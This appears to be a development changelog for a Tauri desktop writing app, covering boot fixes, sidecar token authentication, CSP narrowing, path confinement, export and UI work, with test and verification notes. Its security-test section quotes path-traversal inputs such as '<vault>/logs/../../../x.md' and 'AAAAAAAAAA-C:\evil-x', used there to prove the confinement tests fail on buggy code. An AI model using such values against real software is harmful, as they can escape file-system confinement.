  recorded via a new `Database::with_db_path`. In-memory test databases keep the locked path,
  since there is no file to reopen.
- **`backupCreate` no longer gates boot.** It was `await`ed inside the startup sequence, so the
  tab restore deciding which document the user lands on waited behind a whole-file copy. Now
  fired without `await`.
- **Four SQLite pragmas added.** Only `journal_mode` was set, so the rest ran at defaults that
  cost real time here: `synchronous` defaulted to FULL, meaning **every commit fsynced the WAL**
  while the editor autosaves on each pause â€” the most frequent disk sync in the product. Now
  `synchronous=NORMAL` (the standard WAL companion: still crash-safe against application
  crashes, and the app already has snapshots and version history), plus `cache_size=-20000`
  (~20 MB against a ~2 MB default, with repeated scans re-reading from disk),
  `mmap_size=256 MB`, and `temp_store=MEMORY`.
- **RAG retrieval N+1 removed.** `rag_search` issued one `query_row` per semantic hit (default
  10), each walking the b-tree again, with the connection mutex held throughout. Now a single
  `IN (â€¦)` statement with the per-hit distance re-attached; ordering and scoring unchanged.

### Tests
- `tests/backend-parity.mjs` (`npm run test:parity`) â€” pins the TypeScript mirror to the
  **Rust** contract (Rust owns publishing/export) across `slugify`, `markdownToText`, the embed
  step, pass ordering, display-text selection and the PIN constants. Falsifiable: it fails
  against the pre-fix mirror, because `previewInlineEmbeds` did not exist.
- `doc_store::rag_search_returns_content_and_honours_locked_docs` â€” guards the batched chunk
  fetch: results still carry real content and finite scores, locked docs stay excluded, and
  open docs are not over-filtered. It also records that `create_doc` does not chunk, so the test
  builds the index the way the app does.
- `tests/renderer-path-guard.mjs` (`npm run test:pathguard`) â€” asserts
  `open_external_file` takes no renderer path and reads `PendingLaunchFile`, that no caller
  passes one, that `create_doc` still routes through `resolve_in_vault`, and that the
  `provider_probe` key allowlist stays hardcoded rather than settings-derived. Proven
  falsifiable: **9 checks fail** against the pre-fix sources.
- `tests/sidecar-auth.mjs` (`npm run test:sidecarauth`) â€” 36 checks, and the Python half
  is **executed**, not asserted: both servers are booted for real and probed. Unauthenticated
  GET â†’ 401, wrong token â†’ 401, correct token â†’ 200, and an unauthenticated bodyless POST
  (the request a website can send blind) â†’ 401. Each server is also started *without* the
  env var and asserted to **exit** rather than serve. The Rust half is checked statically:
  each manager holds and mints a UUID token, passes it to the child, and the count of
  `.header(TOKEN_HEADER, â€¦)` call sites equals the count of request builders. Proven
  falsifiable â€” neutralising the TTS comparison makes it report `200` where `401` is
  required (4 failures).
- `tests/csp-desktop.mjs` extended to pin the four sidecar ports explicitly, assert **no**
  wildcard loopback range survives, assert the retired Ollama endpoint stays out, and assert
  every cloud provider host is still reachable â€” so the narrowing cannot be redone into a
  silent AI outage.
- `doc_store.rs`: `truncate_bytes_safe_never_splits_a_character` (asserts every returned
  index is a char boundary and a prefix, across CJK/em-dash/emoji seams at 9 cut points),
  `sanitize_filename_survives_multibyte_titles`, `snippet_of_never_panics_on_multibyte_bodies`,
  `iso_date_gate_accepts_only_yyyy_mm_dd`, `log_get_or_create_rejects_a_non_iso_date`,
  `logs_titles_cannot_escape_the_vault`, and `create_doc_confines_the_path_it_writes`.
  Every input in these aborted the corresponding invoke before the fix.
- `tests/acl-parity.mjs` extended to the **fourth** list (`api.ts` â†’ `browserBackend`),
  which is what let `app_boot_ready` ship unmirrored. Its own command-matching regex had
  the same blind spot as the e2e guard it was modelled on: `safeInvoke<[^>]+>` misses every
  nested generic, hiding 4 commands, and a fixed-width window missed calls with long
  inline object types. Now anchored on the real `>("name")` call with a lazy generic â€”
  176 measured, matching the 177 `safeInvoke` mentions minus the one definition.
  `ai_generate_stream` is an enumerated, comment-justified exemption (streaming cannot be
  mirrored into localStorage), not an open-ended allowance.

### Verification
- `npm run check`: 0 errors, 0 warnings. `npm run test:source`: exit 0.
- `npm run test:smoke` (1280 / 390 / 390-dirty): all PASS, **0 console errors and
  0 warnings** in every viewport. `npm run test:e2e`: all checks passed, exit 0
  (including the lazy-shell timeout/retry and label contracts). `npm run test:tabs`
  and `test:shell`: exit 0 â€” run specifically because four workspaces now mount
  through `LazyWorkspace`.
- `tests/acl-parity.mjs`: 177/177 across lib.rs, build.rs and permissions, 176/176 mirrored
  into `browserBackend.ts`.
- The `provider_probe` key-allowlist **algorithm** was separately verified by porting it to
  JS and running all 32 vectors (withheld from public and lookalike hosts, sent to the five
  providers case-insensitively, sent to local/LAN including IPv6 loopback, and every
  IP-spoof case). That caught a real bug: `[::1]` was denied until bracket stripping was
  added, which would have broken key-auth to a local vLLM bound to IPv6 loopback.
- **Rust compiles and its tests pass: `cargo check` clean, `cargo test --lib` 64 passed /
  0 failed.** This covers every Rust change in this batch â€” the UTF-8 helpers, vault
  confinement, `is_iso_date`, the `snapshot_list` lock filter, all three sidecar token
  managers, `provider_probe`, and `open_external_file`.
  `cargo check` immediately earned its keep: it caught **3 real errors in new code** that
  inspection had missed â€” `collect()` from an iterator of `Option<u32>` into
  `Option<Vec<u32>>` has no `FromIterator` impl, leaving the binding an `Option` and
  failing the two indexings after it. Rewritten to validate each octet explicitly, which
  also tightened the check (a `parse` that had accepted `+1`/`-1`/leading spaces now
  cannot).
- **The new tests are falsifiable, and two of them were not until this was checked.**
  Reintroducing the three original bugs makes all six `doc_store` security tests fail, each
  panicking at its own assertion. The first attempt at that check appeared to pass â€” for
  two reasons worth recording:
  1. `cargo test` had silently **not rebuilt**: restoring the file with `Copy-Item`
     preserved the backup's older mtime, so cargo re-ran the *buggy* binary and reported
     failures against correct source. Fixed by touching the file after every restore.
  2. The path-confinement tests were **lexically unsound**. `Path::starts_with` compares
     components from the left, so an escaping path like `<vault>/logs/../../../x.md` still
     satisfies `starts_with(<vault>/logs)` â€” the first components genuinely do match. The
     original titles were worse: `"AAAAAAAAAA-C:\evil-x"` has a single dash-separated
     segment before byte 10, so it fell into the id-based branch *even with the bug
     reintroduced*. Both tests now normalise with `normalize_lexically` first, and the
     traversing input is pinned separately (`..-..-..-x`) as the only shape that reaches
     the `parts.len() >= 3` directory join.

### Known-open (from the same audit, not yet addressed)
- `doc_store.rs` is ~4500 lines; `database.rs`, `models.rs` and `lib.rs` still have **no**
    tests of their own. 21 of 280 `api` methods have no callers, each dragging ~4 parallel
    list entries with it (`scriptTimeline*` is a fully-wired dead feature). `BODY.md`
    documents 36 components; 71 exist, and it attributes `generate_handler!` to the wrong
    file. A structural split of `doc_store` and a regenerated BODY map are the remaining
    maintenance work; neither is a user-visible bug.
  - `search_docs` uses `LIKE '%q%'`, which cannot use `idx_docs_title`/`idx_docs_path` and so
    scans the table. `search_docs_fts` (FTS5 + bm25) already exists and is what the command
    palette uses. Routing `doc_search_full` to FTS is a **product** decision, not a pure
    optimisation: FTS is token-based, so it would change substring-search behaviour that
    partial-word lookups currently rely on.
  - `idx_rag_chunks_content` indexes the full chunk text, but every caller searches it with a
    leading `%`, which no B-tree can serve — so it is never read while still taxing every
    chunk insert. Dropping it (and adding a `rag_chunks_fts` table for the keyword fallback,
    which currently scans all chunk text) is the correct follow-up to the N+1 fix above.
  - `perf_benchmark`'s "search latency" probe measures an unindexed `LIKE` pattern no user path
    uses, while holding the sole connection mutex for 10 consecutive scans — so the number in
    Settings → About describes something the app deliberately avoids, and pressing the button
    stalls concurrent work.

## Unreleased (desktop shell: ghost window, boot race, ACL parity)

### Fixed
- **Ghost window â€” service worker bricked the embedded shell.** `public/sw.js` used a
  hardcoded cache name (`just-write-ehis-v2`) that was never bumped, and its `fetch`
  handler was cache-first for same-origin GETs including the HTML document. After an
  update it kept serving a cached `index.html` naming content-hashed chunks the new
  build no longer shipped; the entry module then loaded as `text/html` and never
  executed. `#app` stayed empty, `showMainWindow()` never ran, so the hidden main
  window was never revealed â€” and with no frontend there was no IPC at all, which is
  why AI, STT/TTS/LLM, memory, pandoc and the widget were all dead at the same time.
  Registration is now gated to the web/Android PWA path (`index.html`), where the cache
  has a purpose; inside Tauri the page actively unregisters any pre-existing worker and
  drops caches, which is what heals an install a previous build already poisoned (an
  active worker keeps controlling the page until it is removed). `sw.js` also carries a
  versioned cache name, purges non-current caches on `activate`, and serves documents
  network-first with the cache as the offline fallback â€” hashed `/assets/` stay
  cache-first, which is safe because they are content-addressed.
- **Ghost window â€” release builds targeted the dev server.** `Cargo.toml` was missing
  the mandatory `custom-protocol` feature, so `tauri-build` always set `cfg(dev)`: any
  `cargo build --release` produced a binary that loaded `http://localhost:5173` instead
  of the embedded assets. With no dev server running the webview never loaded and the
  same ghost window resulted. The feature is restored and documented in place.
- **Boot race against the Rust backend.** Tauri creates the configured windows and
  starts their webviews *before* `setup()` returns, so the frontend mounted and issued
  commands while the database and sidecar managers were still unmanaged. Those calls
  failed with `state not managed for field 'db'` and, because the boot steps do not
  retry, stayed dead for the session: file watcher, Home dashboard, status-bar stats,
  inbox triage banner, streak nudge, and the companion widget's document commands.
  `commands::BootReady` is now managed as the first statement of `setup` and flipped
  as the last, and the frontend waits on `app_boot_ready` (`src/lib/bootGate.ts`) before
  running any boot step. The gate fails open: a backend that never reports ready still
  boots.
- **False "boot step timed out" warning.** `bootStep` treated `result === null` as a
  timeout, but commands returning `Result<(), String>` (e.g. `setup_file_watcher`)
  serialise their `Ok` payload to `null` â€” so successful steps were reported as timed
  out and polluted the slow-steps boot diagnostic. The timeout now uses a sentinel.
- **Desktop CSP blocked the app's own fonts.** `font-src 'self'` rejected the `data:`
  URIs that Vite emits for any woff2 under 8 KB â€” the small `latin-ext`/`cyrillic`
  subsets. 12 inlined font faces in the current bundle were refused, producing a console
  error per face on every boot and silent fallback to a system font for those glyphs, in
  an app built around typography. `img-src` and `media-src` already allowed `data:`/`blob:`;
  `font-src` now allows `data:`. The browser build has no CSP, which is why
  `npm run test:smoke`'s zero-console-error bar never caught it.

### Added
- `tests/ghost-window-guard.mjs` (`npm run test:ghostwindow`) â€” asserts the desktop
  shell can never register a service worker, that the worker is versioned and
  network-first for documents, and that the Tauri branch unregisters and clears caches.
- `tests/boot-gate-unit.mjs` (`npm run test:bootgate`) â€” the gate's recovery from
  early `not-managed` rejections, its fail-open behaviour, and its timeout budget.
- `tests/acl-parity.mjs` (`npm run test:aclparity`) â€” checks the three hand-maintained
  ACL lists agree: `generate_handler!` in `lib.rs`, `COMMANDS` in `build.rs`, and the
  `allow-*` grants in `permissions/*.toml`. A command registered but not granted fails
  only at runtime with `Command X not allowed by ACL`, which is how the boot gate
  shipped denied; forgetting `build.rs` fails the build. Both directions are now named
  failures.
- `tests/csp-desktop.mjs` (`npm run test:csp`) â€” asserts the desktop CSP allows what the
  built bundle actually uses (cross-checked against `dist/assets/*.css`), while pinning
  `script-src` free of `unsafe-inline`/`unsafe-eval`, `object-src 'none'`, and
  `base-uri 'self'` so the fix cannot be made by blanket loosening.
- `app_boot_ready` command plus `api.appBootReady()`, granted to the main window.

### Verification
- Confirmed against a running release binary before `src-tauri/target` was cleared:
  main window `visible: true` with title `Just Write ehis`; frontend interactive;
  zero service-worker registrations and zero caches in the desktop shell; TTS `ok` on
  8091 with the Kokoro bundle resolved; LLM `ok` on 8093; `convert_status` reporting
  pandoc with all six formats; companion widget window rendering.
- Reproduced the original failure first: stale `index.html` requesting a chunk absent
  from the new build, entry module rejected for `text/html`, `#app` with 0 children,
  and `EnumWindows` reporting the correctly-sized main window as `Visible = False`.
- `tests/ghost-window-guard.mjs` was run against the pre-fix sources and fails 9 checks
  there, so it genuinely detects the regression it guards.
- `npm run check`: 0 errors, 0 warnings. `npm run build`: passes. `npm run test:source`:
  exit 0. `cargo build --release --features custom-protocol`: passes.
- Not verified: STT and the memory sidecar were never exercised against a live binary,
  and the `bootStep` sentinel fix has only been type-checked and built, not observed in
  a running app. `src-tauri/target` was cleared at the user's request, so both await the
  next build.

## Unreleased (2026-09-25: settings, native models, and PIN repair)

### Changed
- Editor typography is shared from first paint through CodeMirror prose and Script editing, with bundled mono fonts and validated numeric settings.
- STT/TTS/LLM health now reflects process readiness, lazy TTS model load, real LLM completion, bounded polling, cleanup after failure, and Settings runtime tests.
- Release builds preflight model assets and package native STT/TTS/memory runtimes with PyInstaller; Rust prefers packaged executables, rejects untrusted renderer-supplied roots, and restricts development fallback interpreters to PATH command names.
- App/document locking defaults off, requires confirmed PIN setup, fails closed on unknown keychain state, gates the main and widget shells, rejects empty-PIN verification, and adds session backoff/removal paths. AI memory loopback calls use a per-launch token.

### Verification
- `npm run check`, `npm run test:source`, `npm run test:assets`, `npm run test:resolve`, `npm run test:widget`, `npm run test:widget-proof`, and `npm run test:e2e` pass.
- `npm run test:onboard` reports an explicit `SKIP` until a fresh frontend bundle exists; no frontend, PyInstaller, Tauri, or installer build was run.

## Unreleased (Area 8: export fidelity + pandoc bundle)

### Changed
- **Shared export preprocess** (convert.rs, used by convert_run + compile_run): `![[embeds]]` inlined (missing/locked â†’ note), `[[links]]` â†’ display text (standalone files, documented), frontmatter YAML block + title default, `.attachments/` staged into the pandoc tempdir with `--resource-path` (built-in HTML keeps `<img>` + vault note)
- **Compile join**: per-doc `# Title` + content demoted one level (no collisions), `---` separators, 5M-char cap refusing with zip-of-chapters guidance
- **Pandoc decision: bundle** (signed off). 3.11 measured 41.8 MB download / **233.6 MB exe** â€” budget ~90â€“120 MB installer, not 30â€“50; binary git-ignored with fetch docs, `externalBin` registered, `convert_status.bundled` distinguishes sidecar vs PATH
- **Menus show all six formats always**, pandoc-gated disabled with inline reason; Novel compile select gated the same; palette gains a compile-format select + preflight (no throw-at-click) + bulk progress/cancel; fountain via one shared `downloadFountain`
- **batchExport**: 4-way `mapLimit` (same shape as chapter batches), progress, cancel, streamed DEFLATE zip, attachments bundled via binary-safe `attachment_read` (dedupe helper exported + tested)
- **Publish: Rust wins** â€” TS twin deleted (regex markdown, raw customJs). Rust now honors customCss/customJs (breakout-neutralized), inlines images as data URIs (2 MB cap, counted), single-file scope documented

### Tests
- `cargo test convert_`: join/demote, slugify, frontmatter, wikilinks, embeds, attachments, preprocess order, bundled detection (8 passed)
- `tests/export-batch.mjs` (12): dedupe, bounded concurrency, 20-tab unique zip + bundled attachments, no-pandoc friendly failure, cancel

## Unreleased (Area 7: Reader structure + controls)

### Changed
- **Reading controls**: one compact row (serif/sans/mono, AÂ± 12â€“24 with reset-to-base, narrow/comfortable/wide, app/light/sepia/dark) persisted per-Reader (`readerFont/readerSize/readerMeasure/readerTheme`, size 16 default reproduces today's look)
- **Rendering honesty**: stored bodies render through the shared escape-first markdownâ†’HTML path (headings/lists/quotes are real structure now, not literal `#`); bookparse emits `#`/`- `/`| ` structure and `![alt](dropped-image)` markers; only that exact target renders a captioned placeholder (transclude/export behavior unchanged); transclude islands pass through untouched
- **Position that survives reflow**: heading-id + intra-section ratio anchors in frontmatter (ratio persisted as before for back-compat), restored after `document.fonts.ready`; library cards gain % progress bars + cover slot (EPUB art saved via attachment on import, kind badge when empty)
- **Read-aloud tracking**: Reader passes pre-split sections; the button plays section-by-section with highlight + autoscroll (selection still wins; editors keep the single-shot path); long sections chunk at 6000 chars â€” never one giant call; stop resolves pending playback (no hangs, no tail)
- **ONE ReaderProse** component (typography/theme/measure + native content-visibility windowing + progressive 12+8 section append). MarkdownViewer stays CodeMirror: it is an editable raw-file surface with save â€” converging it would delete editing. EditorPane reading mode untouched for the same reason
- Mobile: toolbar + controls wrap at 480px, content padding scales

### Tests
- `tests/reader-sections.mjs` (24): splitting/islands, TTS strip, chunk bounds, anchor math, markdown structure, image-target scoping
- `tests/reader-surface.mjs` (15): seeded book â†’ sections/cards/progress/cover-slot, controls live-switch, read-aloud entry
- `tests/audio-stop.mjs` (6): stop-mid-decode resolves with no tail, live stop halts source, normal path intact

## Unreleased (Area 6: voice sidecar lifecycle)

### Changed
- **One managed child owner**: `ManagedSidecar{port}` in sidecar.rs serves all 5 managers â€” dead handles reaped + respawned (never early-Ok on a corpse), stop() is kill()+wait() (no zombies), Drop kills best-effort so children die with the app, stale port holders reclaimed (orphan sidecar killed + restarted, foreign holders fail closed with a typed error)
- **No indefinite hangs**: every sidecar reqwest client carries a timeout (30s default, 180s transcribe/synthesize/LLM); empty LLM/memory content is a real error, not `""`
- **Startup without races**: one `ensureSidecar()` + `pollUntilHealthy()` (500ms/15s, "Starting Moonshineâ€¦ Ns" progress) replaces the fixed 500ms/1s sleeps in STT/TTS/LLM/memory; LLM cold load awaits readiness so ghost can't cloud-fallback on first run; Mic/TTS buttons gate on model_loaded only after a probe (never disabled cold) with the fetch hint wired
- **Validation**: `sidecarValidate.ts` (traversal rejected, shape-checked) on Settings blur with inline errors; new `sidecar_python_probe` command (`python --version`, preview degrades readable); STT/TTS servers fail closed on `..` escapes and missing explicit picks (no silent bundled fallback); empty-path guards on stt/tts start
- **TTS stop actually stops**: live source handle with stop()+disconnect() + mid-decode generation guard (decode caveat documented); ReadAloudButton gains a real loading state; MicButton offers one-tap browser dictation on sidecar failure (explicit tap = consent, never auto-switch â€” panel holds no position either way)
- **Mobile/voice**: 44px mic/TTS targets under 480px; Web Speech errors surface one-line reasons (not-allowed/no-speech/network)

### Tests
- `cargo test managed_`: invalid spawn, foreign-port fail-closed, dead-handle respawn, stop-reaps (4 passed)
- `tests/sidecar-validate.mjs` (18), `tests/ensure-poll.mjs` (9: flaky-health boot, cap, short-circuit, failure), `tests/sidecar-resolve.py` (16 against the real server code)

## Unreleased (Area 5: AI core dedupe + hardening)

### Changed
- **Slot duplication deleted**: one `resolveSlot()` in commands.rs (was Ã—3 endpoint/model pairs), one `post_chat_completions()` for ai_generate/structurize, one `guardRate()` + shared `friendlyEndpointError()` via `src/lib/aiRequest.ts` (was Ã—3 copies each in AiPanel), providerTest.ts confirmed as the single `/models` probe (Settings + panel mount)
- **Silent failures fixed**: ai_generate/structurize check HTTP status like the stream path (401/403 key, 429 rate, 408 timeout) with one 429/503 retry + backoff, never `""` on empty choices; ghost failures record to a `ghostStatus` store (surfaced in the panel's Ghost tab) instead of warnâ†’null; RAG/memory shortfalls show a one-line notice in the context chip; structurize remote-fallback warns with reason; `sidecar_start("")` is a typed error at the Rust boundary
- **Ghost disambiguated**: GhostPanelâ†’DocForkPanel, GhostBadgeâ†’ForkBadge (fork UI, not autocomplete); Ghost tab is live (enable toggle, small-slot probe with latency, last-suggestion status, routing note); routing enforced â€” ghost reads local :8093 if enabled else small slot, callers pass workspace only
- **harness.tsâ†’memorySidecar.ts** (port 8092, not legacy 8080) with a deprecated re-export shim; llm sidecar takes `--ctx-size` from settings
- **Panel UX**: privacy lock badge on private workspaces; Replace always confirms (Insert-instead one click away); write-back bar keyboard/touch reachable (was hover-only) and hidden on Error/Locked messages; writeBack is a FIFO queue (rapid clicks no longer drop events); Thinkingâ€¦ shows elapsed/total per path timeouts; mobile header wraps â‰¤480px, sheet 88vh, action bars visible on touch
- **Small model as first-class**: `smallModelContextLength` (llama-server ctx, applies on restart) + `useSmallAsMain` route chat/Composer/Structurize at lfm2.5-350m, with Settings controls

### Tests
- `cargo test ai_slot`: resolveSlot defaults/blanks/explicit + status map (4 passed)
- `tests/ai-request-unit.mjs` (19), `tests/writeback-queue.mjs` (8), `tests/ai-error-probe.mjs` (dead-endpoint reject friendly + structurize local fallback)
- e2e anchors updated to the new contracts (slot routing, fork rename, confirm, badge, countdown, ctx setting, Rust hardening)

## Unreleased (Area 4: brutalist + glass as real themes)

### Changed
- **Brutalist is its own palette now** (was byte-identical to dark): hazard theme â€” near-black concrete `#100F0D`, safety-amber `#FFB000` accent, 0 radius + hard ink shadows via tokens (not overrides), amber selection/focus, per-theme CodeMirror hazard editor
- **Glass glows**: luminous mint accent `#A9E8C6`, `rgba(143,199,169,0.3)` selection, `--accent-glow` on active nav/tabs/primary buttons, frosted blur extended to palette/modals/dialogs, swollen radius scale via tokens, translucent mint CodeMirror editor
- **Token gaps closed**: `--surface-elevated`, `--accent-on`, `--accent-semantic-yellow` defined in all 4 themes + system fallback; fallback gains `--ws-inbox/files/properties`; `--danger` aliased to `--error`; light `--ink-muted` darkened to `#5F5C50` for 4.5:1 small-text contrast
- **Literal-color bypasses tokenized**: on-accent whites â†’ `var(--text-on-accent)` (TabBar, Logs, NodeMap, Projects, VaultRename, VersionHistory, FileBrowser), AiPanel cancel â†’ semantic-red, SettingsPane perf â†’ semantic-green/`--warning`, charts/craft/skills/usage hues â†’ semantic tokens (SVG-safe `var()`), NodeMap rings follow theme accent/warning, EditorPane snippet expansion deferred past the update cycle (same crash class as autocorrect â€” expansion was silently dead)
- **Kept fixed deliberately** (verified, not overlooked): ConflictBanner amber (fixed bg carries contrast in every theme â€” tokenizing would break it), recording-red/TTS-blue whites (4.5+/5.2:1 on fixed brand bgs), PDF page white (document fidelity), canvas card hues + NodeMap dots (user/data identity colors), streak heat cells (GitHub-style convention)
- Decision: keep all 4 themes (signed off); no in-repo "3 themes" text exists (external spec holds that)

### Tests
- `tests/theme-sweep.mjs` extended (50 checks): per-theme token contract, brutalist/glass distinctness, WCAG contrast text-on-bg + on-accent-on-accent â‰¥ 4.5:1 (all pass with margin), editor-palette parity with app.css, mounts under all 4 themes

## Unreleased (Area 3: app-shell navigation)

### Changed
- **One grouping source**: `src/lib/workspaceGroups.ts` (Create/Capture/Organize/Explore) now drives both the desktop sidebar headers and the mobile More menu â€” they can't drift apart again. Sidebar keeps its drag-reorder, recency auto-sort, pinned Home, and inbox/canvas/files hide-list; only the group definition moved
- **Mobile More menu grouped**: flat 15-icon grid replaced by Create/Capture/Organize/Explore/Tools sections; Craft/Stats/Skills duplicate entries removed (single Settings â€” all three were Settings tabs); mobile nav visits now feed recency like desktop
- **Home promoted to top** (signed off: Home only): persistent Home button at the start of the BreadcrumbBar; sidebar keeps its pinned Home
- **Mobile bottom stack fixed**: StatusBar no longer renders on phones (was a second strip above BottomBar); a quiet save-state dot in the BottomBar preserves the persist signal. Docs/words/streak/stats remain one tap away on Home
- Removed stale `"craft"` from `lockCoveredWorkspaces` (redirects to Settings on the same tick, never a live workspace)
- Desktop TabBar + BreadcrumbBar stay separate (signed off); typing-focus auto-collapse already handles the crowded-while-writing case

### Tests
- `tests/shell-nav.mjs` (`npm run test:shell`, 18 checks): desktop + mobile dual boot â€” unified sections, no duplicates, palette still surfaces Inbox/Canvas/Files, mobile reachability, no StatusBar on phones, promoted-Home navigation
- `tests/theme-sweep.mjs` (`npm run test:themes`, 12 checks): shell mounts error-free under all 4 themes (dark, light, brutalist, glass)

## Unreleased (Area 2: lazy shell + Novel Studio surface)

### Bug Fixes
- **Lazy workspaces could go blank forever in silence**: `LazyWorkspace` swallowed load errors (empty `.catch`) and a never-settling chunk stayed on "Loadingâ€¦" permanently. Loads now go through `src/lib/lazyLoad.ts` (`loadWithTimeout`, 9s): rejections and hangs reach a retryable failed state showing the reason, log `[LazyWorkspace] failed to load <label>: â€¦`, and offer a Retry button that re-invokes the loader. All 14 lazy call sites labeled; `main.ts` logs `vite:preloadError` app-wide. Code-splitting itself untouched
- **Novel Studio had no reachable writing surface**: new projects landed on an empty beat board (editor needs a selected scene). `createProject` now bootstraps Act 1 â†’ Sequence 1 â†’ Scene 1 (scenes only render inside a sequence) and opens it immediately; empty projects show an unmissable "Start writing" affordance doing the same
- **Novel import dropped you on the board**: `handleImportFile` now selects the first imported scene so you land in the editor on chapter 1

### Tests
- `tests/lazy-load-probe.mjs` (`npm run test:lazy`): documents the jsdom stylesheet-link mechanism per workspace (informational by design)
- `tests/lazy-load-failure.mjs` (`npm run test:lazyfail`): rejection/hang/success contract of the loader (9 checks)
- `tests/novel-surface.mjs` (`npm run test:novel`): proves the failure path through the real component (failed state + Retry + labeled log); board happy-path phases run wherever chunks actually resolve and are joined by new e2e static anchors

## Unreleased (Just Write core editor)

### Bug Fixes
- **Autosave snap-back**: the doc-open effect rebuilt the editor on every `$currentDoc` assignment, including the autosave metadata refresh ~500ms after each pause â€” typed text visibly reverted to stale store content. The editor now rebuilds only on a new doc id (`openDocId` guard); regression-covered by `tests/write-probe.mjs` (instance-survival + live-content checks)
- **Undo history wipe on settings changes**: theme/font/autocorrect/dictionary edits (and typewriter/focus toggles) destroyed and recreated the `EditorView`, resetting CodeMirror `history()`. All four now live in `Compartment`s reconfigured in place via `reconfigureAppearance()`
- **Autocorrect never fired**: the shared plugin dispatched synchronously inside `ViewPlugin.update`, which CodeMirror forbids â€” every Layer 1/2 fix crashed (`Calls to EditorView.update are not allowed while an update is in progress`) and was dropped. Fixes are now scheduled via `queueMicrotask` and re-validated against the live doc before applying
- **Ghost autocomplete rendered as a bottom-center popup** instead of at the cursor. Now an inline `Decoration.widget` at the selection head (`src/lib/ghostWidget.ts`, `cm-ghost-inline`); Tab/Esc, debounce, and lock/privacy gating unchanged; stale cross-doc suggestions dismissed on doc switch
- **Rust save path swallowed disk errors**: `save_doc` ignored `write_to_disk` failures (`let _`), so SQLite and files-on-disk could silently diverge. Disk errors now propagate to the caller like `atomic_save` already did
- **File watcher never fired**: the `notify` watcher was dropped at the end of `setup_file_watcher`; now intentionally leaked for app lifetime (`std::mem::forget`)
- Removed stale "never wired" comment above the (actually wired) `searchKeymap`; Ctrl+F panel opening is now probe-tested

### Tests
- `tests/write-probe.mjs` (`npm run test:write`): real `EditorView.dispatch` typing â€” existing-doc render/type/persist, tab switching without cross-contamination, split-pane independence, live autocorrect, Ctrl+F panel (25 checks)
- `tests/ghost-widget.mjs` (`npm run test:ghost`): inline widget render/follow/replace/clear (11 checks)
- `tests/autocorrect-unit.mjs` (`npm run test:autocorrect`): rule-table spot checks + custom-dict veto (16 checks)

## 0.2.1 (2026-09-20)

### New Features
- **Home dashboard Goals section**: Docs with word-count targets now appear on the home page with progress bars, deadlines, and overdue indicators
- **Canvas inline editing**: Double-click any card on the canvas board to edit title and body in place â€” Escape cancels, Enter/blur commits
- **DockSplit drag-resize dividers**: Reusable vertical + horizontal dividers for Novel, Inbox, Projects, Canvas, and Reader workspaces, with per-workspace persisted splits
- **Side-by-side split editors**: Toggle split pane in Write workspace; both panes autosave independently; AI write-back targets main or split pane
- **Find/replace (Ctrl+F)**: `@codemirror/search` integration in EditorPane, JustWriteWorkspace, and split pane
- **Shared editorFocus module**: Typewriter mode and focus dimming extracted to `src/lib/editorFocus.ts` for reuse across all editors

### Editor-First UI
- Collapsible sidebar (Ctrl+B) and inspector toggle (Ctrl+I)
- AI panel minimize/restore with Ctrl+J
- BreadcrumbBar doubles as a command bar with workspace toggle buttons
- Per-workspace Focus Editor toggles (Docs, Inbox, Projects)
- Auto-hide chrome during typing: tab bar and breadcrumb collapse after 2.5s idle, restore on mouse-to-top or Escape
- Compact mode for tighter chrome
- No floating icons or glass effects â€” all solid backgrounds

### Settings Overhaul
- Skills, Craft, and Stats moved into Settings as embeddable categories
- Settings deep-link store (`settingsCategory`) with `openSettingsAt()` navigation
- Old workspace IDs redirect to Settings automatically

### Performance
- SettingsPane and AiPanel lazy-loaded (code-split)
- `modulePreload.polyfill: false` for smaller initial bundle
- Heavy routes wrapped in `LazyWorkspace.svelte`
- Persisted UI chrome prefs (`jwe-ui-panels` localStorage)

### Backend
- `dashboard_goals` Rust command + SQL query for docs with word-count targets
- Browser preview mock for `dashboard_goals` in browserBackend

### Bug Fixes
- Removed floating palette circle and sidebar expand button (no more floating triggers)
- All overlays use solid `var(--bg-primary)` backgrounds
- StatusBar docked Search + Capture buttons

### Maintenance
- Removed stale `api.ts.bak` backup file
- E2e test coverage for inline canvas editing and goal progress wiring
- All 143 API commands verified paired between Rust backend and TS frontend
- Zero encoding/mojibake issues in source files
- 0 npm/Cargo dependency issues

---

## 0.2.0 (2026-09-18)

Initial signed release.

### Core
- Tauri v2 + Svelte 5 + CodeMirror 6 writing app
- 12 writing workspaces: Write, Docs, Inbox, Projects, Novel, Script, Canvas, NodeMap, Reader, Logs, Settings (with embedded Skills/Craft/Stats)
- Full-text search, backlinks, version history with snapshots
- AI panel with chat, Composer, Structurize, Ghost autocomplete
- Voice: STT (Moonshine GGUF) and TTS (Kokoro) via sidecar processes
- Local LLM integration (LFM 2.5-350M via llama.cpp)
- AI memory sidecar with cross-session facts and secret scrubbing

### Import/Export
- EPUB, PDF, DOCX, Markdown, Fountain import
- Export to Markdown, TXT, HTML, DOCX, EPUB, PDF
- Novel compile to multiple formats
- Script export to Fountain and HTML

### Canvas & Node Map
- Freeform canvas board with draggable cards, edges, and doc linking
- Node Map for document relationship visualization
- Beat board for novel structure

### Editor Features
- Typewriter mode, focus dimming, autocorrect
- Goal tracking with word-count targets and deadlines
- Daily notes with location/weather stamps
- Templates for reusable document structures
- Lock/unlock documents for privacy
- Pinned documents for quick access

### Build
- NSIS installer for Windows
- Auto-updater with signed releases
- Browser preview backend for development